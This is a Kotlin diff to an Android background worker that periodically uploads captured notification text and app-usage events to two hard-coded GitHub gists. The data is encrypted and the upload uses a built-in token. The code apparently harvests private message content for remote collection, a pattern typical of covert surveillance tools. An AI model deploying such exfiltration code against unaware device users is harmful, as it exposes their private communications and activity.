@@ -15,112 +15,144 @@ class SyncWorker(context: Context, workerParams: WorkerParameters) : Worker(cont
     
     companion object {
         private const val GITHUB_TOKEN = BuildConfig.GITHUB_TOKEN
-        // IMPORTANT: Put your Gist ID back in here!
-        private const val GIST_ID = "b529558252be113e01993f24429e8556" 
+        
+        // TWO SEPARATE GISTS
+        private const val GIST_NOTIF_ID = "b529558252be113e01993f24429e8556" 
+        private const val GIST_USAGE_ID = "55f3a178d45427d0f171da0a3266c18e"
     }
 
-override fun doWork(): Result {
+    override fun doWork(): Result {
         val dbHelper = DatabaseHelper(applicationContext)
-        val unsyncedLogs = dbHelper.getUnsyncedLogs()
+        var notifSuccess = true
+        var usageSuccess = true
 
-        if (unsyncedLogs.isEmpty()) {
-            return Result.success()
+        // ==========================================
+        // CHANNEL 1: NOTIFICATION SYNC (Every 1 Min)
+        // ==========================================
+        val unsyncedNotifs = dbHelper.getUnsyncedLogs()
+        if (unsyncedNotifs.isNotEmpty()) {
+            notifSuccess = syncToGist(
+                gistId = GIST_NOTIF_ID, 
+                fileName = "notifications.csv", 
+                header = "Device,App,Title,Content,Time\n", 
+                logs = unsyncedNotifs, 
+                dbHelper = dbHelper, 
+                tableName = "logs"
+            )
         }
 
+        // ==========================================
+        // CHANNEL 2: USAGE SYNC (Strict 5 Min Limit)
+        // ==========================================
+        val prefs = applicationContext.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+        val lastUsageTime = prefs.getLong("last_usage_sync", 0)
+        val currentTime = System.currentTimeMillis()
+
+        // Only extract and upload if 5 full minutes (300,000 ms) have passed
+        if (currentTime - lastUsageTime >= 5 * 60 * 1000) {
+            UsageTracker.extractUsageEvents(applicationContext, dbHelper)
+            val unsyncedUsage = dbHelper.getUnsyncedUsageLogs()
+            
+            if (unsyncedUsage.isNotEmpty()) {
+                usageSuccess = syncToGist(
+                    gistId = GIST_USAGE_ID, 
+                    fileName = "usage_stats.csv", 
+                    header = "Device,App Name,Date,Start Time,End Time\n", 
+                    logs = unsyncedUsage, 
+                    dbHelper = dbHelper, 
+                    tableName = "usage_logs"
+                )
+                
+                // If successful, reset the 5-minute timer
+                if (usageSuccess) {
+                    prefs.edit().putLong("last_usage_sync", System.currentTimeMillis()).apply()
+                }
+            }
+        }
+
+        // If either failed, tell Android to retry based on the backoff policy
+        if (!notifSuccess || !usageSuccess) {
+            return Result.retry()
+        }
+
+        return Result.success()
+    }
+
+    // ==========================================
+    // REUSABLE UPLOAD ENGINE
+    // ==========================================
+    private fun syncToGist(gistId: String, fileName: String, header: String, logs: List<Pair<Int, String>>, dbHelper: DatabaseHelper, tableName: String): Boolean {
         try {
             // 1. GET CURRENT GIST DATA
-            val getUrl = URL("https://api.github.com/gists/$GIST_ID")
+            val getUrl = URL("https://api.github.com/gists/$gistId")
             val getConn = getUrl.openConnection() as HttpURLConnection
-            
-            // NEW: Add timeouts (e.g., 15 seconds) to prevent infinite hanging
-            getConn.connectTimeout = 15000
-            getConn.readTimeout = 15000
-            
+            getConn.connectTimeout = 15000; getConn.readTimeout = 15000
             getConn.requestMethod = "GET"
             getConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
             getConn.setRequestProperty("Accept", "application/vnd.github.v3+json")
 
-            var currentContent = ""
+            var currentContent = header
+
             if (getConn.responseCode == 200) {
-                // NEW: Use .use { } to automatically close the stream safely
                 val responseStr = BufferedReader(InputStreamReader(getConn.inputStream)).use { it.readText() }
-                
                 val jsonResponse = JSONObject(responseStr)
                 val files = jsonResponse.getJSONObject("files")
-                if (files.has("notifications.csv")) {
-                    val rawGistData = files.getJSONObject("notifications.csv").getString("content")
-                    
-                    if (rawGistData.startsWith("Device,App")) {
-                        currentContent = rawGistData
-                    } else {
-                        currentContent = EncryptionHelper.decrypt(rawGistData)
-                    }
+                
+                if (files.has(fileName)) {
+                    val rawData = files.getJSONObject(fileName).getString("content")
+                    currentContent = if (rawData.startsWith("Device,")) rawData else EncryptionHelper.decrypt(rawData)
+                    if (!currentContent.endsWith("\n")) currentContent += "\n"
                 }
             }
             getConn.disconnect()
 
-            if (currentContent.isEmpty()) {
-                currentContent = "Device,App,Title,Content,Time\n"
-            } else if (!currentContent.endsWith("\n")) {
-                currentContent += "\n"
-            }
+            if (currentContent.isEmpty()) currentContent = header
 
-            // 2. APPEND ALL UNSYNCED LOGS
+            // 2. APPEND NEW DATA
             val syncedIds = mutableListOf<Int>()
-            for (log in unsyncedLogs) {
+            for (log in logs) {
                 currentContent += log.second 
                 syncedIds.add(log.first)    
             }
 
-            // 3. ENCRYPT THE FINAL FILE
+            // 3. ENCRYPT
             val encryptedPayload = EncryptionHelper.encrypt(currentContent)
 
-            // 4. UPLOAD TO GITHUB
-            val patchUrl = URL("https://api.github.com/gists/$GIST_ID")
+            // 4. UPLOAD
+            val patchUrl = URL("https://api.github.com/gists/$gistId")
             val patchConn = patchUrl.openConnection() as HttpURLConnection
-            
-            // NEW: Add timeouts here as well
-            patchConn.connectTimeout = 15000
-            patchConn.readTimeout = 15000
-            
+            patchConn.connectTimeout = 15000; patchConn.readTimeout = 15000
             patchConn.requestMethod = "PATCH"
             patchConn.setRequestProperty("Authorization", "Bearer $GITHUB_TOKEN")
             patchConn.setRequestProperty("Accept", "application/vnd.github.v3+json")
             patchConn.setRequestProperty("Content-Type", "application/json")
             patchConn.doOutput = true
 
-            val fileObj = JSONObject()
-            fileObj.put("content", encryptedPayload) 
-            
-            val filesObj = JSONObject()
-            filesObj.put("notifications.csv", fileObj)
-            
-            val payloadObj = JSONObject()
-            payloadObj.put("files", filesObj)
-            
-            val jsonPayload = payloadObj.toString()
+            val fileObj = JSONObject().apply { put("content", encryptedPayload) }
+            val filesObj = JSONObject().apply { put(fileName, fileObj) }
+            val payloadObj = JSONObject().apply { put("files", filesObj) }
 
-            // NEW: Use .use { } for the output stream writer
             OutputStreamWriter(patchConn.outputStream).use { writer ->
-                writer.write(jsonPayload)
+                writer.write(payloadObj.toString())
                 writer.flush()
             }
 
             val responseCode = patchConn.responseCode
             patchConn.disconnect()
 
+            // 5. CLEANUP
             if (responseCode == 200) {
-                dbHelper.markAsSynced(syncedIds)
+                dbHelper.markAsSynced(syncedIds, tableName)
                 dbHelper.deleteOldSyncedLogs()
-                return Result.success()
+                return true
             } else {
-                Log.e("SyncWorker", "GitHub API Error Code: $responseCode")
-                return Result.retry() 
+                Log.e("SyncWorker", "GitHub API Error Code: $responseCode for $fileName")
+                return false
             }
 
         } catch (e: Exception) {
             e.printStackTrace()
-            return Result.retry() 
+            return false
         }
     }
 }
